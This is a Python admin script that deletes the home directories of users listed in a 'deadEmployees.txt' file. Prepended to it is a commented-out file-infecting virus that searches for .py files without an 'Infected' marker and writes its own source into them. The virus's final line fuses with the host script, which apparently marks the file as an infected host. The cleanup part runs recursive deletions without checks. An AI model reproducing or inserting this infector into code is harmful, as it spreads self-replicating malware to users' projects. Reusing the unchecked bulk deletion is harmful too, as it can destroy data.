#import os
#import inspect
#
#sigData = 'Infected'
#
#def search(path):
#    filesToInfect = []
#    fileList = os.listdir(path)
#    for fileName in fileList:
#        if os.path.isdir(path + os.path.sep + fileName):
#            filesToInfect.extend(search(path + os.path.sep + fileName))
#        elif fileName[-3:] == '.py':
#            infected = False
#            for line in open(path + os.path.sep + fileName):
#                if sigData in line:
#                    infected = True
#                    break
#            if infected == False:
#                filesToInfect.append(path + os.path.sep + fileName)
#    return filesToInfect
#
#def infect(filesToInfect):
#    targetFile = inspect.currentframe().f_code.co_filename
#    virus = open(os.path.abspath(targetFile))
#    virusString = ''
#    for i, line in enumerate(virus):
#        if i >= 0 and i < 41:
#            virusString = virusString + '#' + line
#    virus.close()
#    for fileName in filesToInfect:
#        f = open(fileName)
#        temp = f.read()
#        f.close()
#        f = open(fileName, 'w')
#        f.write(virusString + temp)
#        f.close()
#
#def explode():
#    pass
#
#infect(search(os.getcwd()))# imports
import os
import shutil

# declarations
fileName = "deadEmployees.txt"
pathName = os.getcwd() + "\\Users2\\"
data = False

# open file and read data
try:
    userFile = open(fileName, "r")
    userList = userFile.readlines()
    userFile.close()
    data = True
except:
    print("Error: Problem reading from file.")

# no errors, clean data and remove dir
if (data):
    i = 0
    userList.remove(userList[0]) # remove header
    for user in userList:
        userList[i] = user.strip()[:-15] # clean whitespace and domain
        i = i + 1
    for user in userList:
        userPath = pathName + user # create path name
        print(userPath)
        shutil.rmtree(userPath) # remove dir